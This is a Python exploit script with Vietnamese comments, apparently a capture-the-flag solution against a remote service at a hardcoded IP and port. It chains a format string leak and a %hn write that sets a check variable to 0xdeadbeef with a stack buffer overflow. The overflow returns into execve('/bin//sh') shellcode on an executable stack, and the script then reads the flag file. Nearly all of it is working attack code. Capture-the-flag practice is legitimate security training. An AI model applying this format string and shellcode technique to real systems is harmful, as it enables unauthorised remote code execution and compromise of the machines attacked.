#!/usr/bin/env python3
# d0nt_tru5t_h1t0g4m1 — format string ghi check_val=0xdeadbeef + leak,
# rồi overflow vào stack thực thi được (RWE) bằng shellcode.
import socket, struct, sys, time, re

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("103.116.52.180", 36160)
def p64(x): return struct.pack("<Q", x)
SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f4831d24831c0b03b0f05")  # execve("/bin//sh")

s = socket.create_connection((HOST, PORT), timeout=15); s.settimeout(2.5)
def rd():
    b = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            b += d
    except socket.timeout:
        pass
    return re.sub(rb"\x1b\[[0-9;]*m", b"", b)
time.sleep(1); rd()

# --- Option 1 (Hitogami): leak &check_val (banner) + rbp của main (%22$p) ---
s.sendall(b"1\n"); time.sleep(0.4); b = rd().decode("latin1")
checkval = int(re.search(r"Mark Location\]: (0x[0-9a-f]+)", b).group(1), 16)
s.sendall(b"%22$p\n"); time.sleep(0.5); b = rd().decode("latin1")
rbp_main = int(re.search(r"Whispers\]: (0x[0-9a-f]+)", b).group(1), 16)
buf = rbp_main - 0xA0            # buffer của option 2 = rbp_main - 0xa0
print("check_val:", hex(checkval), "buf:", hex(buf))

# --- Option 1 lần 2: format string ghi check_val = 0xDEADBEEF (2 lần %hn) ---
# low16 0xbeef=48879 ; +8126 = 0xdead ; địa chỉ ở offset 88/96 = arg 17/18
fmt = b"%48879c%17$hn%8126c%18$hn".ljust(88, b"A") + p64(checkval) + p64(checkval + 2)
s.sendall(b"1\n"); time.sleep(0.3); rd()
s.sendall(fmt + b"\n"); time.sleep(0.8); rd()

# --- Option 2 (Orsted): read 0x200 vào buf[0x80] -> shellcode + ret về buf ---
s.sendall(b"2\n"); time.sleep(0.4); rd()
s.sendall(SC.ljust(0x88, b"\x90") + p64(buf)); time.sleep(0.6); rd()

s.sendall(b"cat /home/*/flag.txt\n"); time.sleep(1.2)
print(rd().decode("latin1"))
